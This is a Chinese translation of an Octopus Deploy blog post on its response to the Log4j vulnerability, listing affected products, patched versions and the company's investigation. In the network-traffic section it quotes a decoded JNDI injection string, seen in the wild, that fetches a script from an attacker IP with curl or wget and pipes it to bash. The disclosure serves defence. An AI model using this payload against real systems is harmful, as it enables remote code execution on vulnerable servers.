# Octopus Deploy 对 Log4j 的回应- Octopus Deploy

> 原文：<https://octopus.com/blog/octopus-deploy-log4j-response>

2021 年 12 月 9 日，星期四，Octopus Deploy 获悉 Log4j 日志记录实用程序( [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228) )中存在漏洞。我们立即制定了安全事件响应计划，以调查我们对该实用程序的使用及其对我们的产品和基础架构的影响。

幸运的是，章鱼云、章鱼服务器、章鱼触手不受影响。但是，有一些相关产品受到影响，需要更新。

在本帖中，我们分享了我们的调查结果以及我们为客户推荐的后续步骤。

## 用于 Octopus 部署的 JetBrains 团队城市插件

JetBrains TeamCity 插件的 6.1.7 版本使用 Log4j 的 2.15.0 版本。但是，6.1.7 之前的所有插件版本都使用 Log4j 的 2.14.1 版本，因此可能容易受到远程代码执行的攻击。

### 你需要做什么

TeamCity 的 Octopus Deploy 插件版本 6.1.7 可从市场上获得。如果您是 TeamCity 用户，您应该会通过 Web 用户界面得到此更新的通知，我们强烈建议您安装此更新。

关注我们的[安全顾问](https://advisories.octopus.com/adv/2021-12---Octopus-Deploy-TeamCity-Plugin-log4j2-dependency.2306410241.html)获取更新。

## Octopus Java SDK

Java SDK 的 0.0.3 版使用 Log4j 的 2.15.0 版。但是，0.0.3 之前的所有 Java SDK 版本都使用 Log4j 的 2.14.1 版本，因此容易受到远程代码执行的攻击。

### 你需要做什么

我们建议使用 Octopus Java SDK 的客户将其 SDK 版本更新到 0.0.3。

关注我们的[安全顾问](https://advisories.octopus.com/adv/2021-13---Octopus-Java-Client-SDK-log4j2-dependency.2306475696.html)获取更新。

## 章鱼云、章鱼服务器和章鱼触手

章鱼云、章鱼服务器、章鱼触手不受此漏洞影响。它们是用。NET 框架，不要使用 Log4j 的任何移植版本。

## 所有产品的明细

| 产品 | 使用了易受攻击的 Log4j 版本 | 易受攻击的产品版本 | 修补的产品版本 |
| --- | --- | --- | --- |
| Azure Devops & TFS 扩展 | 不 | 不适用的 | 不适用的 |
| 竹子附加物 | 不 | 不适用的 | 不适用的 |
| Java SDK | 是 | ⇐ 0.0.2 | 0.0.3 |
| Jenkins 插件 | 不 | 不适用的 | 不适用的 |
| Octopus CLI | 不 | 不适用的 | 不适用的 |
| 章鱼云 | 不 | 不适用的 | 不适用的 |
| 章鱼服务器 | 不 | 不适用的 | 不适用的 |
| 章鱼触手 | 不 | 不适用的 | 不适用的 |
| TeamCity Plugin | Yes | ⇐ 6.1.5 | 6.1.7 |

## Octopus 部署受到威胁了吗？

我们的内部基础设施运行使用易受攻击的 Log4j 版本的产品。然而，在 12 月 9 日星期四的最初公告后，我们投入了大量时间，我们相信 Octopus Deploy 没有受到影响。

当我们的工程团队努力更新受影响的产品时，我们的安全运营团队分析了我们的系统，以确定它们是否被利用了。接下来的部分将进一步深入我们的方法。

### 审查我们的内部基础设施

我们内部基础设施的绝大部分是作为代码基础设施(IaC)来维护的。这使我们能够轻松识别潜在的易受攻击系统，并以最少的干预将更新推送到这些系统。

当我们无法确定系统是否易受攻击时，我们使用已知概念证明(PoC)来测试系统是否易受攻击。这意味着我们可以更好地减轻特定系统。

### 查看网络流量

我们在整个基础架构中维护大量网络数据，这使我们能够识别可能导致基础架构被利用的可疑网络行为。在审查网络数据时，我们发现了以下问题:

1.  可疑活动-我们发现了进入我们系统的可疑入站网络流量，包括源 IP。然而，我们没有发现任何令人放心的恶意出站流量。
2.  确定目标系统-在分析网络数据时，我们确定了被攻击的特定系统。我们对这些系统采取了额外的控制和缓解措施，以降低被利用的风险。

下面是一个用户代理字符串，它被发送到我们的一个服务器上(经过解码和编辑):

```
${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/(curl -s 45.155.205.233:5874/XXX.XXX.XXX.XXX:443||wget -q -O- 45.155.205.233:5874/XXX.XXX.XXX.XXX:443)|bash} 
```

### 审查终点

使用来自网络数据的信息，我们审查了我们知道已经成为攻击目标的特定终端，并确认它们没有受到威胁。

通过在我们的终端上使用 EDR 解决方案，我们还密切监控终端的危害或潜在利用迹象。这些数据(以及其他数据集)被输入到我们的 SIEM(安全事件和事件管理)系统中，因此我们可以获得近乎实时的警报，并做出相应的响应。

使用所有这些方法来调查我们的基础设施，我们没有发现任何妥协的证据。

## 结论

我们将继续跟踪与此漏洞相关的更新。如果我们的客户或产品存在任何风险，我们将提供进一步的更新。

如果您有任何问题，请通过[support@octopus.com](mailto:support@octopus.com)联系。